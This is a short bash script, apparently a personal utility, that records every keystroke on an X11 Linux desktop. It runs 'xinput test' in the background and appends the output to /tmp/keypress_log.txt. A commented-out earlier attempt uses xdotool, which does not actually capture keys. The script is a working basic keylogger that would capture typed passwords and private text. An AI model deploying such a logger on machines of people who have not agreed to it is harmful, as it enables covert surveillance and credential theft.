# #!/bin/bash
# LOG_FILE="/tmp/keypress_log.txt"

# echo "Starting keypress logging..." > $LOG_FILE

# # Loop to continuously capture keypress events
# while true; do
#     ACTIVE_WINDOW=$(xdotool getactivewindow getwindowname 2>/dev/null)
    
#     if [[ ! -z "$ACTIVE_WINDOW" ]]; then
#         PRESSED_KEY=$(xdotool key)
#         echo "$(date): Key pressed in $ACTIVE_WINDOW: $PRESSED_KEY" >> $LOG_FILE
#     fi

#     sleep 0.1  # Adjust logging speed if needed
# done

#!/bin/bash
LOG_FILE="/tmp/keypress_log.txt"

echo "Starting keypress logging at $(date)" > $LOG_FILE

# Get the keyboard ID dynamically
KEYBOARD_ID=$(xinput list | grep -i "keyboard" | grep -o 'id=[0-9]*' | cut -d= -f2 | head -n 1)

if [ -z "$KEYBOARD_ID" ]; then
    echo "Error: No keyboard device found!" >> $LOG_FILE
    exit 1
fi

echo "Tracking keypresses from keyboard ID: $KEYBOARD_ID" >> $LOG_FILE

# Start logging keypresses
xinput test "$KEYBOARD_ID" >> "$LOG_FILE" &

